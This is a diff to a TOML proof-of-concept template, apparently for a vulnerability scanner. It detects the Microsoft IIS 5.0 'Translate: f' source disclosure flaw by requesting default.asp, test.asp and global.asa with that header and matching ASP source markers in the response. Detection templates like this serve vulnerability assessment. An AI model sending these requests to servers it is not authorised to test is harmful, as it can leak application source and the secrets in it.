@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "通过发送带有 Translate: f 头的 HTTP 请求验证 IIS 5.0 源代码泄露漏洞，若服务端返回脚本源码而非执行结果则说明存在漏洞"
+description = "检测 Microsoft IIS 5.0 是否存在 Translate: f 头导致的 ASP 源代码泄露漏洞"
 id = "POC-AVE-2000-0588"
 name = "Microsoft IIS 5.0 Translate: f Source Disclosure PoC"
 severity = "medium"
@@ -15,23 +15,66 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/global.asa"
+path = "/{{BaseURL}}/default.asp"
 protocol = "http"
 
 [poc.requests.headers]
 Translate = "f"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "Application",
-    "CODEPAGE",
     "<%",
+    "%>",
+    "Response.Write",
+    "<script language=",
+    "VBScript",
+    "ASP",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/test.asp"
+protocol = "http"
+
+[poc.requests.headers]
+Translate = "f"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "%>",
+    "Response.Write",
+    "<script language=",
+    "VBScript",
+    "ASP",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/global.asa"
+protocol = "http"
+
+[poc.requests.headers]
+Translate = "f"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "%>",
+    "Application_OnStart",
+    "Session_OnStart",
+    "Application_OnEnd",
+    "Session_OnEnd",
 ]
